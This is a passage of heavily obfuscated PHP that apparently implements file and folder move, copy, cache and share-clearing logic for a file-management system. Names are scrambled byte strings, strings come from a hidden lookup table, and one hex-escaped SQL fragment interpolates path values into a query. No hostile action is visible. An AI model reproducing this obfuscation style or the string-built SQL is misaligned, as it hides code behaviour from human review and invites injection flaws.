$this->saveAll($aÂ•³ğ‰Ï´); return $dšÛİˆ¾¾ß; goto FÂõŠÁˆ¦; FÂõŠÁˆ¦: } private function _childrenMakeRelation($DİçÍĞè¤, $ağ¸—–™ÄË) { $FÅš‰¬îâ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E†ÑÙÔµöÙ = array(); $B»¢’Ú®ÈÊ = array(); foreach ($DİçÍĞè¤ as $BÎÏˆ¢÷ß) { $E·¿¸Æ‰ = $BÎÏˆ¢÷ß[$FÅš‰¬îâ[28]] . $FÅš‰¬îâ[8] . $BÎÏˆ¢÷ß[$FÅš‰¬îâ[490]]; $E†ÑÙÔµöÙ[$E·¿¸Æ‰] = $BÎÏˆ¢÷ß[$FÅš‰¬îâ[399]]; } foreach ($ağ¸—–™ÄË as $BÎÏˆ¢÷ß) { $E·¿¸Æ‰ = $BÎÏˆ¢÷ß[$FÅš‰¬îâ[28]] . $FÅš‰¬îâ[8] . $BÎÏˆ¢÷ß[$FÅš‰¬îâ[490]]; $B„ğë¿°¡ç = $E†ÑÙÔµöÙ[$E·¿¸Æ‰]; $B»¢’Ú®ÈÊ[$B„ğë¿°¡ç] = $BÎÏˆ¢÷ß[$FÅš‰¬îâ[399]]; } return $B»¢’Ú®ÈÊ; } private function _childrenMatch($F‰îƒ›ò², $dˆˆ–æºŒ, $eÂÕÅè¯¡) { goto CÒÅÛÔÏğ; CÒÅÛÔÏğ: $D„ÖÅ†’™í =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C÷ùâ¼Ø = $eÂÕÅè¯¡[$D„ÖÅ†’™í[490]]; $f¶‰”à×ìğ = $this->parentLevelArray($dˆˆ–æºŒ[$D„ÖÅ†’™í[490]]); goto Bç‡ğ©ä„; Bç‡ğ©ä„: foreach ($f¶‰”à×ìğ as $E…š…Ş±îç) { if (isset($F‰îƒ›ò²[$E…š…Ş±îç])) { $C÷ùâ¼Ø .= $F‰îƒ›ò²[$E…š…Ş±îç] . $D„ÖÅ†’™í[549]; } } $C÷ùâ¼Ø = rtrim($C÷ùâ¼Ø, $D„ÖÅ†’™í[47]) . $D„ÖÅ†’™í[47]; $Bğ„™½—§ = $this->parentLevelArray($C÷ùâ¼Ø); goto b„¨§­Œ‚³; b„¨§­Œ‚³: $Cíàİ™«âÈ = $Bğ„™½—§[count($Bğ„™½—§) - 1]; return array($D„ÖÅ†’™í[481] => $Cíàİ™«âÈ, $D„ÖÅ†’™í[490] => $C÷ùâ¼Ø); goto f¢ø«ä„‹±; f¢ø«ä„‹±: } private function _makeItemData($f½ãÂìå˜—, $d ±‘é¡Şã, $FÙÀÛ¶•é) { $C±öÔ©ŞÀñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BÓ³Å–É ‚ = array($C±öÔ©ŞÀñ[550] => $f½ãÂìå˜—[$C±öÔ©ŞÀñ[406]], $C±öÔ©ŞÀñ[416] => $FÙÀÛ¶•é, $C±öÔ©ŞÀñ[551] => $f½ãÂìå˜—[$C±öÔ©ŞÀñ[408]], $C±öÔ©ŞÀñ[451] => $f½ãÂìå˜—[$C±öÔ©ŞÀñ[450]], $C±öÔ©ŞÀñ[552] => $f½ãÂìå˜—[$C±öÔ©ŞÀñ[87]], $C±öÔ©ŞÀñ[553] => $d ±‘é¡Şã[$C±öÔ©ŞÀñ[407]], $C±öÔ©ŞÀñ[554] => $d ±‘é¡Şã[$C±öÔ©ŞÀñ[487]], $C±öÔ©ŞÀñ[555] => USER_ID, $C±öÔ©ŞÀñ[556] => USER_ID, $C±öÔ©ŞÀñ[398] => $d ±‘é¡Şã[$C±öÔ©ŞÀñ[399]], $C±öÔ©ŞÀñ[557] => $d ±‘é¡Şã[$C±öÔ©ŞÀñ[490]] . $d ±‘é¡Şã[$C±öÔ©ŞÀñ[399]] . $C±öÔ©ŞÀñ[47], $C±öÔ©ŞÀñ[425] => 0, $C±öÔ©ŞÀñ[558] => $C±öÔ©ŞÀñ[33]); return $BÓ³Å–É ‚; } private function _copyApplyMeta($Bß—£Ÿòëª, &$eˆÌô…¾ŸŞ) { $cÉ’¶«öÅ² =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cÁ¢åÓà‹º = $Bß—£Ÿòëª[$cÉ’¶«öÅ²[399]]; $e¬‰§‚ëÒ“ = $Bß—£Ÿòëª[$cÉ’¶«öÅ²[28]]; if (!isset($Bß—£Ÿòëª[$cÉ’¶«öÅ²[559]]) || !$Bß—£Ÿòëª[$cÉ’¶«öÅ²[559]] || $Bß—£Ÿòëª[$cÉ’¶«öÅ²[559]] == $cÉ’¶«öÅ²[500]) { $eˆÌô…¾ŸŞ[$cÉ’¶«öÅ²[535]][] = array($cÉ’¶«öÅ²[399], $cÁ¢åÓà‹º, $cÉ’¶«öÅ²[559], short_id($cÁ¢åÓà‹º)); } if (Input::check($e¬‰§‚ëÒ“, $cÉ’¶«öÅ²[560])) { $eˆÌô…¾ŸŞ[$cÉ’¶«öÅ²[534]][] = array($cÉ’¶«öÅ²[399] => $cÁ¢åÓà‹º, $cÉ’¶«öÅ²[102] => $cÉ’¶«öÅ²[447], $cÉ’¶«öÅ²[380] => str_replace($cÉ’¶«öÅ²[50], $cÉ’¶«öÅ²[33], Pinyin::encode($e¬‰§‚ëÒ“))); $eˆÌô…¾ŸŞ[$cÉ’¶«öÅ²[534]][] = array($cÉ’¶«öÅ²[399] => $cÁ¢åÓà‹º, $cÉ’¶«öÅ²[102] => $cÉ’¶«öÅ²[446], $cÉ’¶«öÅ²[380] => Pinyin::encode($e¬‰§‚ëÒ“, $cÉ’¶«öÅ²[561])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($BˆÕá¸ŞŒ‘) { goto fš—ñùæâ‘; eêóÎÀçÙ: $Fù­’©Ôƒ™ = array($C÷áí…§îÆ[490] => array($C÷áí…§îÆ[516], $F§Íö­££ç[$C÷áí…§îÆ[490]] . $BˆÕá¸ŞŒ‘ . $C÷áí…§îÆ[517]), $C÷áí…§îÆ[426] => $this->targetIsDelete); $f‹é‹ßë† = $this->field($c—¯äÂÚ)->where($Fù­’©Ôƒ™)->select(); if (!$f‹é‹ßë†) { return; } goto B÷ª£Õ…ñ; B÷ª£Õ…ñ: $f‹é‹ßë† = array_to_keyvalue($f‹é‹ßë†, $C÷áí…§îÆ[399]); foreach ($f‹é‹ßë† as $dæ‚éˆìÃ) { $CòŒİª„ªˆ = $dæ‚éˆìÃ[$C÷áí…§îÆ[481]]; $BˆÕá¸ŞŒ‘ = $dæ‚éˆìÃ[$C÷áí…§îÆ[399]]; if (!isset($this->_childrenListCache[$BˆÕá¸ŞŒ‘]) && $dæ‚éˆìÃ[$C÷áí…§îÆ[406]] == $C÷áí…§îÆ[96]) { $this->_childrenListCache[$BˆÕá¸ŞŒ‘] = array(); } if (!isset($this->_childrenListCache[$CòŒİª„ªˆ])) { $this->_childrenListCache[$CòŒİª„ªˆ] = array(); } $this->_childrenListCache[$CòŒİª„ªˆ][$BˆÕá¸ŞŒ‘] = $dæ‚éˆìÃ; $this->_childrenItemCache[$BˆÕá¸ŞŒ‘] = $dæ‚éˆìÃ; } goto CØÈï®Ï¸÷; fš—ñùæâ‘: $C÷áí…§îÆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F§Íö­££ç = $this->sourceInfo($BˆÕá¸ŞŒ‘); $c—¯äÂÚ = $C÷áí…§îÆ[427]; goto eêóÎÀçÙ; CØÈï®Ï¸÷: } private function _childrenListAll($fçÄ‰ğˆ©, &$EÇ¯ÖØŒ) { $B‡ÀÍÚ´é‹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!isset($this->_childrenListCache[$fçÄ‰ğˆ©])) { return; } $D¼Îñ‚”ê¦ = $this->_childrenListCache[$fçÄ‰ğˆ©]; foreach ($D¼Îñ‚”ê¦ as $f³œØš©é => $cà‡‚•â¿) { $EÇ¯ÖØŒ[$f³œØš©é] = $cà‡‚•â¿; if ($cà‡‚•â¿[$B‡ÀÍÚ´é‹[406]] == $B‡ÀÍÚ´é‹[96]) { $this->_childrenListAll($f³œØš©é, $EÇ¯ÖØŒ); } } } private function sourceInfoCache($b™âª¶Èëˆ) { if (isset($this->_childrenItemCache[$b™âª¶Èëˆ])) { return $this->_childrenItemCache[$b™âª¶Èëˆ]; } return $this->sourceInfo($b™âª¶Èëˆ); } private function _childrenList($cÅ’—Ó¹¼) { if (isset($this->_childrenListCache[$cÅ’—Ó¹¼])) { return $this->_childrenListCache[$cÅ’—Ó¹¼]; } return $this->_childrenListSelect($cÅ’—Ó¹¼); } private function _childrenListSelect($f¦Ú‡½) { goto a¤çÅ·Ş‘; b‡Ä×¥Á¬: foreach ($cÓª¿æŠ½Â as $f¦Ú‡½ => $DáÏÍê…§) { $this->_childrenItemCache[$f¦Ú‡½] = $DáÏÍê…§; } return $cÓª¿æŠ½Â; goto Eİ´½¥ÙÅ‹; FåÆô¡ñ§‚: $däÆÑ‚Ô = $däÆÑ‚Ô ? $däÆÑ‚Ô : array(); $cÓª¿æŠ½Â = array_to_keyvalue($däÆÑ‚Ô, $A¾º¼×Ø…±[399]); $this->_childrenListCache[$f¦Ú‡½] = $cÓª¿æŠ½Â; goto b‡Ä×¥Á¬; a¤çÅ·Ş‘: $A¾º¼×Ø…± =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d‹‡ƒ‘ÑË‰ = array($A¾º¼×Ø…±[481] => $f¦Ú‡½, $A¾º¼×Ø…±[426] => $this->targetIsDelete); $däÆÑ‚Ô = $this->where($d‹‡ƒ‘ÑË‰)->select(); goto FåÆô¡ñ§‚; Eİ´½¥ÙÅ‹: } private function fileNameExistCache($C÷Ğ”Ë”ß, $A¸§Â­Û»‰) { $DêçÌİ‰¤È =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A¸§Â­Û»‰ = strtolower($A¸§Â­Û»‰); $eÛ„È°–©š = $this->_childrenList($C÷Ğ”Ë”ß); foreach ($eÛ„È°–©š as $Aƒ£©ÌŠ«•) { if ($A¸§Â­Û»‰ == strtolower($Aƒ£©ÌŠ«•[$DêçÌİ‰¤È[28]])) { return $Aƒ£©ÌŠ«•[$DêçÌİ‰¤È[399]]; } } return !1; } private function fileNameAutoCache($fËŒğ×Û¼‡, $BÁÖ««Òã˜, $bñ¥µƒ‡¨ì, $bËô¹ñƒƒ) { $Cå ™°²À =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÓ‡‚à‘¦Ï = $this->_childrenList($fËŒğ×Û¼‡); $D°Š‘á „¶ = array_to_keyvalue($EÓ‡‚à‘¦Ï, $Cå ™°²À[33], $Cå ™°²À[28]); return $this->fileNameAutoGet($D°Š‘á „¶, $BÁÖ««Òã˜, $bñ¥µƒ‡¨ì, $bËô¹ñƒƒ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($BÀÛÓÅ–¼Ú, $DÉºÚ‰ÂÎ©, $DÇ‡‰İŠçƒ = REPEAT_REPLACE, $A¯«ÆôÅˆö = '') { goto E¦à¬¾“¢ã; e¹ƒ„ ªî: if ($F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[481]] == $dƒõóš–ï”[$e‰˜ˆÍÀ¼œ[399]]) { if ($F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[426]] == $e‰˜ˆÍÀ¼œ[96]) { Model($e‰˜ˆÍÀ¼œ[424])->restore(array($BÀÛÓÅ–¼Ú)); } if (!$A¯«ÆôÅˆö || $A¯«ÆôÅˆö == $F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[28]]) { return $BÀÛÓÅ–¼Ú; } } $fçªÔÀÈ = $this->pathInfoMore($BÀÛÓÅ–¼Ú); if ($this->isParentOf($BÀÛÓÅ–¼Ú, $DÉºÚ‰ÂÎ©)) { return !1; } goto E£–ãÊ‹í; B¯Ÿç–‚Óµ: $EÔ²Òè“»® = $this->fileNameExistCache($DÉºÚ‰ÂÎ©, $F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[28]]); $A¡¥¡Òññ‡ = $this->_move($BÀÛÓÅ–¼Ú, $DÉºÚ‰ÂÎ©, $DÇ‡‰İŠçƒ, $B¯Ë¢ÂÜ‡«, $A¯«ÆôÅˆö); $this->sourceCacheClear(); goto a¶ÇÄà£Æ ; dçÊªç ×¬: $this->updateModifyTime($d÷¶‡¶“); Model($e‰˜ˆÍÀ¼œ[537])->eventMove($BÀÛÓÅ–¼Ú, $F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[481]], $DÉºÚ‰ÂÎ©); Hook::trigger($e‰˜ˆÍÀ¼œ[563], $fçªÔÀÈ); goto cĞ£Ö©À„›; bÀ«Ì°é¨Â: $this->folderSizeReset($DÉºÚ‰ÂÎ©); $d÷¶‡¶“ = array($F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[481]], $DÉºÚ‰ÂÎ©); if ($F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[406]] == $e‰˜ˆÍÀ¼œ[96]) { $d÷¶‡¶“[] = $BÀÛÓÅ–¼Ú; } goto dçÊªç ×¬; BÊâËÆª‹…: if ($F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[481]] == $DÉºÚ‰ÂÎ© && $A¯«ÆôÅˆö != $F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[28]]) { $CƒƒŠâ¶˜Ö = $this->fileNameExist($DÉºÚ‰ÂÎ©, $A¯«ÆôÅˆö); if ($CƒƒŠâ¶˜Ö && $F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[406]] == $e‰˜ˆÍÀ¼œ[500]) { goto EÑ‰ç£…»ç; EÑ‰ç£…»ç: $bÒ†Û¿ ƒ = $this->sourceInfo($CƒƒŠâ¶˜Ö); $A“¶öÁ¤‡ = $this->fileHistory($bÒ†Û¿ ƒ, $F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[450]], $F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[87]]); if (!$A“¶öÁ¤‡) { Model($e‰˜ˆÍÀ¼œ[453])->remove($F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[450]]); } goto A §íÊ‰‘; A §íÊ‰‘: $this->removeNow($BÀÛÓÅ–¼Ú, !1); $this->folderSizeReset($DÉºÚ‰ÂÎ©); Hook::trigger($e‰˜ˆÍÀ¼œ[563], $fçªÔÀÈ); goto b„Ú¶Ôˆ§‰; b„Ú¶Ôˆ§‰: return $CƒƒŠâ¶˜Ö; goto f£…ÜÙä˜; f£…ÜÙä˜: } } $f†¥ËñŠƒÏ = $A¯«ÆôÅˆö ? $A¯«ÆôÅˆö : $F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[28]]; $this->lockMoveStart($BÀÛÓÅ–¼Ú); goto CÓê†òÒÂ°; E£–ãÊ‹í: if (!$F‰˜¹ÎñĞâ || !$dƒõóš–ï” || $dƒõóš–ï”[$e‰˜ˆÍÀ¼œ[406]] != $e‰˜ˆÍÀ¼œ[96]) { return !1; } Hook::trigger($e‰˜ˆÍÀ¼œ[562], $fçªÔÀÈ); $this->targetIsDelete = intval($F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[426]]); goto BÊâËÆª‹…; a¶ÇÄà£Æ : if ($F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[406]] == $e‰˜ˆÍÀ¼œ[96] && $EÔ²Òè“»®) { $this->folderSizeResetChildren($A¡¥¡Òññ‡); } Model($e‰˜ˆÍÀ¼œ[201])->linkAdd($B¯Ë¢ÂÜ‡«[$e‰˜ˆÍÀ¼œ[533]]); if ($EÔ²Òè“»® && $B¯Ë¢ÂÜ‡«[$e‰˜ˆÍÀ¼œ[564]]) { $this->removeNow($BÀÛÓÅ–¼Ú, !1); } goto E–ÃÛ¹ëï˜; cĞ£Ö©À„›: return $A¡¥¡Òññ‡; goto c÷îºä­•; E¦à¬¾“¢ã: $e‰˜ˆÍÀ¼œ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F‰˜¹ÎñĞâ = $this->sourceInfo($BÀÛÓÅ–¼Ú); $dƒõóš–ï” = $this->sourceInfo($DÉºÚ‰ÂÎ©); goto e¹ƒ„ ªî; E–ÃÛ¹ëï˜: $this->lockMoveEnd($BÀÛÓÅ–¼Ú); $this->lockWriteEnd($DÉºÚ‰ÂÎ©, $f†¥ËñŠƒÏ); $this->folderSizeReset($F‰˜¹ÎñĞâ[$e‰˜ˆÍÀ¼œ[481]]); goto bÀ«Ì°é¨Â; CÓê†òÒÂ°: $this->lockWriteStart($DÉºÚ‰ÂÎ©, $f†¥ËñŠƒÏ); $B¯Ë¢ÂÜ‡« = array($e‰˜ˆÍÀ¼œ[533] => array(), $e‰˜ˆÍÀ¼œ[564] => !1); $this->clearShare($BÀÛÓÅ–¼Ú, $DÉºÚ‰ÂÎ©); goto B¯Ÿç–‚Óµ; c÷îºä­•: } private function _move($b˜“ÄØ¡Î, $c‘’ùÆÂ“¦, $BÑßóğ“Í, &$A´ËÂ¯äòÊ, $d‡ù²Ğí§° = '') { goto B¹˜äæñ’Õ; fÒˆôƒßõà: $BÌÛ…ç§Æ = $d‡ù²Ğí§° ? $d‡ù²Ğí§° : $bŠ”Õ‹²²è[$C‚…ç¹â[28]]; $bÄàš–•àõ = $this->fileNameExistCache($c‘’ùÆÂ“¦, $BÌÛ…ç§Æ); $this->lockMoveStart($b˜“ÄØ¡Î); goto C¯¢ëªÈœ¢; DÎÏˆÉÂí½: return $AòíÁì˜ƒ ; goto bĞ—ÎˆŞÛè; C¯¢ëªÈœ¢: $this->lockWriteStart($c‘’ùÆÂ“¦, $BÌÛ…ç§Æ); if (!$bÄàš–•àõ) { return $this->_moveForce($b˜“ÄØ¡Î, $c‘’ùÆÂ“¦, $BÌÛ…ç§Æ); } $AòíÁì˜ƒ  = $bÄàš–•àõ; goto CÅôÈğÙåœ; CÅôÈğÙåœ: $fĞÁÃˆ‹– = !1; if ($BáµªŞ÷«Ï) { if ($BÑßóğ“Í == REPEAT_RENAME_FOLDER) { $BÌÛ…ç§Æ = $this->fileNameAuto($c‘’ùÆÂ“¦, $BÌÛ…ç§Æ, $BÑßóğ“Í, $BáµªŞ÷«Ï); $AòíÁì˜ƒ  = $this->_moveForce($b˜“ÄØ¡Î, $c‘’ùÆÂ“¦, $BÌÛ…ç§Æ); } else { if ($BÑßóğ“Í == REPEAT_RENAME_FOLDER) { $BÑßóğ“Í = REPEAT_RENAME; } $DË¢òÈùÌ = $this->_childrenListSelect($b˜“ÄØ¡Î); foreach ($DË¢òÈùÌ as $C†µôÎ½í©) { $this->_move($C†µôÎ½í©[$C‚…ç¹â[399]], $bÄàš–•àõ, $BÑßóğ“Í, $A´ËÂ¯äòÊ); } $fĞÁÃˆ‹– = !0; } } else { if ($BÑßóğ“Í == REPEAT_SKIP) { $fĞÁÃˆ‹– = !0; } else { if ($BÑßóğ“Í == REPEAT_RENAME || $BÑßóğ“Í == REPEAT_RENAME_FOLDER) { $BÌÛ…ç§Æ = $this->fileNameAuto($c‘’ùÆÂ“¦, $BÌÛ…ç§Æ, $BÑßóğ“Í, $BáµªŞ÷«Ï); $AòíÁì˜ƒ  = $this->_moveForce($b˜“ÄØ¡Î, $c‘’ùÆÂ“¦, $BÌÛ…ç§Æ); } else { if ($BÑßóğ“Í == REPEAT_REPLACE) { $DÀğÁ’·ë = $this->sourceInfoCache($bÄàš–•àõ); $Eäê¦ŒÓŒ = $this->fileHistory($DÀğÁ’·ë, $bŠ”Õ‹²²è[$C‚…ç¹â[450]], $bŠ”Õ‹²²è[$C‚…ç¹â[87]]); if ($Eäê¦ŒÓŒ) { $A´ËÂ¯äòÊ[$C‚…ç¹â[533]][] = $bŠ”Õ‹²²è[$C‚…ç¹â[450]]; } else { $fĞÁÃˆ‹– = !0; } } } } } if ($fĞÁÃˆ‹– && !$A´ËÂ¯äòÊ[$C‚…ç¹â[564]]) { $A´ËÂ¯äòÊ[$C‚…ç¹â[564]] = !0; } goto DÎÏˆÉÂí½; B¹˜äæñ’Õ: $C‚…ç¹â =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bŠ”Õ‹²²è = $this->sourceInfo($b˜“ÄØ¡Î); $BáµªŞ÷«Ï = $bŠ”Õ‹²²è[$C‚…ç¹â[406]] == $C‚…ç¹â[96]; goto fÒˆôƒßõà; bĞ—ÎˆŞÛè: } private function _moveForce($a½²¸ –Ï, $AŸ†µ×È‹, $f¡ê¸ÑÓ­‘) { goto bíİ…äã„; bíİ…äã„: $A„¼ÁŠ…î° =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FŞİŒ„¿ãÜ = $this->sourceInfo($a½²¸ –Ï); $Fí‡ËÌøÂ† = $this->sourceInfo($AŸ†µ×È‹); goto D…’¥àÃ•ƒ; f±ã®•Êˆ·: if ($dìå³ÚËŞ¿) { $Fõá“Í Æ = array($A„¼ÁŠ…î°[557] => array($A„¼ÁŠ…î°[516], $FŞİŒ„¿ãÜ[$A„¼ÁŠ…î°[490]] . $FŞİŒ„¿ãÜ[$A„¼ÁŠ…î°[399]] . $A„¼ÁŠ…î°[517])); $FÖÎ…¼áÉä = $FŞİŒ„¿ãÜ[$A„¼ÁŠ…î°[490]] . $FŞİŒ„¿ãÜ[$A„¼ÁŠ…î°[399]] . $A„¼ÁŠ…î°[47]; $B»ŞÑœ¯÷Ê = $Fí‡ËÌøÂ†[$A„¼ÁŠ…î°[490]] . $Fí‡ËÌøÂ†[$A„¼ÁŠ…î°[399]] . $A„¼ÁŠ…î°[47] . $FŞİŒ„¿ãÜ[$A„¼ÁŠ…î°[399]] . $A„¼ÁŠ…î°[47]; $BÖ™Û×¿İ = array($A„¼ÁŠ…î°[557] => array($A„¼ÁŠ…î°[565], "\162\145\x70\154\x61\143\x65\50\x70\x61\x72\x65\x6e\164\114\x65\166\145\x6c\x2c\x27{$FÖÎ…¼áÉä}\47\54\x27{$B»ŞÑœ¯÷Ê}\x27\x29"), $A„¼ÁŠ…î°[553] => $Fí‡ËÌøÂ†[$A„¼ÁŠ…î°[407]], $A„¼ÁŠ…î°[554] => $Fí‡ËÌøÂ†[$A„¼ÁŠ…î°[487]]); if ($D¨¶¸’¨Ï) { $BÖ™Û×¿İ[$A„¼ÁŠ…î°[425]] = 0; } $this->where($Fõá“Í Æ)->data($BÖ™Û×¿İ)->save(); } $this->where(array($A„¼ÁŠ…î°[413] => $a½²¸ –Ï))->data($AªĞ¯æ²š)->save(); return $a½²¸ –Ï; goto c´îÒ‹¹Ê‰; Dà—³ˆîÛ: if (!$C¥˜â‰¸Ô && $this->moveClearAuth) { Model($A„¼ÁŠ…î°[485])->authClear($a½²¸ –Ï); } $D¨¶¸’¨Ï = $FŞİŒ„¿ãÜ[$A„¼ÁŠ…î°[426]] == $A„¼ÁŠ…î°[96] && $Fí‡ËÌøÂ†[$A„¼ÁŠ…î°[426]] != $A„¼ÁŠ…î°[96]; if ($D¨¶¸’¨Ï) { $AªĞ¯æ²š[$A„¼ÁŠ…î°[425]] = 0; } goto f±ã®•Êˆ·; D…’¥àÃ•ƒ: $dìå³ÚËŞ¿ = $FŞİŒ„¿ãÜ[$A„¼ÁŠ…î°[406]] == $A„¼ÁŠ…î°[96]; $AªĞ¯æ²š = array($A„¼ÁŠ…î°[398] => $Fí‡ËÌøÂ†[$A„¼ÁŠ…î°[399]], $A„¼ÁŠ…î°[557] => $Fí‡ËÌøÂ†[$A„¼ÁŠ…î°[490]] . $Fí‡ËÌøÂ†[$A„¼ÁŠ…î°[399]] . $A„¼ÁŠ…î°[47], $A„¼ÁŠ…î°[553] => $Fí‡ËÌøÂ†[$A„¼ÁŠ…î°[407]], $A„¼ÁŠ…î°[554] => $Fí‡ËÌøÂ†[$A„¼ÁŠ…î°[487]], $A„¼ÁŠ…î°[556] => USER_ID, $A„¼ÁŠ…î°[416] => $f¡ê¸ÑÓ­‘); $C¥˜â‰¸Ô = $FŞİŒ„¿ãÜ[$A„¼ÁŠ…î°[407]] == SourceModel::TYPE_GROUP && $Fí‡ËÌøÂ†[$A„¼ÁŠ…î°[407]] == SourceModel::TYPE_GROUP && $FŞİŒ„¿ãÜ[$A„¼ÁŠ…î°[487]] == $Fí‡ËÌøÂ†[$A„¼ÁŠ…î°[487]]; goto Dà—³ˆîÛ; c´îÒ‹¹Ê‰: } private function clearShare($Eò¥õ“¡Ó, $d…â„§‚’ô) { goto e”¬Û‚·¼Å; e”¬Û‚·¼Å: $A‚¢ÌÉ•×¿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cñÔŞĞ²òÀ = $this->sourceInfo($Eò¥õ“¡Ó); $a¹Åõª²¼ = $this->sourceInfo($d…â„§‚’ô); goto B¿Å¯÷­; f®ï³­§´ë: Model($A‚¢ÌÉ•×¿[567])->where($c¶Ä÷Ø‘ªİ)->save(array($A‚¢ÌÉ•×¿[478] => 0)); Model($A‚¢ÌÉ•×¿[568])->where($c¶Ä÷Ø‘ªİ)->delete(); goto eŒëºŸªÛ; B¿Å¯÷­: if ($cñÔŞĞ²òÀ[$A‚¢ÌÉ•×¿[487]] == $a¹Åõª²¼[$A‚¢ÌÉ•×¿[487]] && $cñÔŞĞ²òÀ[$A‚¢ÌÉ•×¿[407]] == $A‚¢ÌÉ•×¿[566]) { return; } $c¶Ä÷Ø‘ªİ = array($A‚¢ÌÉ•×¿[490] => array($A‚¢ÌÉ•×¿[516], $cñÔŞĞ²òÀ[$A‚¢ÌÉ•×¿[490]] . $Eò¥õ“¡Ó . $A‚¢ÌÉ•×¿[517])); $c´Ä‘–İñ = $this->field($A‚¢ÌÉ•×¿[413])->where($c¶Ä÷Ø‘ªİ)->getField($A‚¢ÌÉ•×¿[399], !0); goto fœöã—ˆò; DŸªˆìùõ: if (!$c¥·ˆÁ«ËÌ) { return; } $c¥·ˆÁ«ËÌ = array_to_keyvalue($c¥·ˆÁ«ËÌ, $A‚¢ÌÉ•×¿[33], $A‚¢ÌÉ•×¿[471]); $c¶Ä÷Ø‘ªİ = array($A‚¢ÌÉ•×¿[471] => array($A‚¢ÌÉ•×¿[7], $c¥·ˆÁ«ËÌ)); goto f®ï³­§´ë; fœöã—ˆò: if (!$c´Ä‘–İñ) { return; } $c¶Ä÷Ø‘ªİ = array($A‚¢ÌÉ•×¿[399] => array($A‚¢ÌÉ•×¿[7], $c´Ä‘–İñ), $A‚¢ÌÉ•×¿[478] => 1); $c¥·ˆÁ«ËÌ = Model($A‚¢ÌÉ•×¿[567])->field($A‚¢ÌÉ•×¿[471])->where($c¶Ä÷Ø‘ªİ)->select(); goto DŸªˆìùõ; eŒëºŸªÛ: } public function copyFolderFromIO($a‰«±Âğï³, $D»–¦áÑÑ¥, $EõïÃóÖëĞ, $aÀ¡”‰ÆæÓ, $Eãöœ‚İ»‹, $e¶ÓÄÂóé = false) { goto D›¹ë¬£äÇ; a‡ÔÈ·¼Ç: if ($EÉË–Ê¬ùÎ) { $this->_childrenAllMake($EÉË–Ê¬ùÎ); } Hook::trigger($a ¬ ¥Ü¥[570]); $this->_copyChildTo($a‰«±Âğï³, $D»–¦áÑÑ¥, $Fè¼ßÔ½¥°, $aÀ¡”‰ÆæÓ, $FŠ¡Ô¨÷õ«, $Eãöœ‚İ»‹); goto A‹Î‡Ä¨¬î; D›¹ë¬£äÇ: $a ¬ ¥Ü¥ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FŠ¡Ô¨÷õ« = array($a ¬ ¥Ü¥[534] => array(), $a ¬ ¥Ü¥[535] => array(), $a ¬ ¥Ü¥[533] => array(), $a ¬ ¥Ü¥[569] => array()); $bêÈ÷åŸ‡Ì = $e¶ÓÄÂóé ? $e¶ÓÄÂóé : $a‰«±Âğï³->pathThis($D»–¦áÑÑ¥); goto B©»¥šŞÒ; FÉÊÍÆ…¦: $this->updateModifyTime($EõïÃóÖëĞ); return $Fè¼ßÔ½¥°; goto BŞéÆ¹¦¹ï; B©»¥šŞÒ: $EÉË–Ê¬ùÎ = $this->fileNameExist($EõïÃóÖëĞ, $bêÈ÷åŸ‡Ì); $Fè¼ßÔ½¥° = $this->mkdir($EõïÃóÖëĞ, $bêÈ÷åŸ‡Ì, $aÀ¡”‰ÆæÓ); if (!$EÉË–Ê¬ùÎ || $aÀ¡”‰ÆæÓ == REPEAT_RENAME_FOLDER) { $aÀ¡”‰ÆæÓ = !1; } goto a‡ÔÈ·¼Ç; A‹Î‡Ä¨¬î: Hook::trigger($a ¬ ¥Ü¥[571]); if ($Fè¼ßÔ½¥°) { $this->folderSizeResetChildren($Fè¼ßÔ½¥°); } $this->_childrenListClear(); goto AÄ÷¬õó‘Í; AÄ÷¬õó‘Í: Model($a ¬ ¥Ü¥[536])->addAll($FŠ¡Ô¨÷õ«[$a ¬ ¥Ü¥[534]], array(), !0); Model($a ¬ ¥Ü¥[537])->eventCopy($Fè¼ßÔ½¥°); $this->saveAll($FŠ¡Ô¨÷õ«[$a ¬ ¥Ü¥[535]]); goto fèî«ÄŸº®; fèî«ÄŸº®: Model($a ¬ ¥Ü¥[453])->linkAdd($FŠ¡Ô¨÷õ«[$a ¬ ¥Ü¥[533]]); Model($a ¬ ¥Ü¥[453])->remove($FŠ¡Ô¨÷õ«[$a ¬ ¥Ü¥[569]]); $this->folderSizeReset($EõïÃóÖëĞ); goto FÉÊÍÆ…¦; BŞéÆ¹¦¹ï: } private function _copyChildTo($e±·ˆ’†«ç, $déùŠ’ô¡, $D²¥°ñøÌ˜, $cåƒïÏ¹¬, &$AàÎÌ¦¼ŸÌ, $dâ›å² ô) { goto 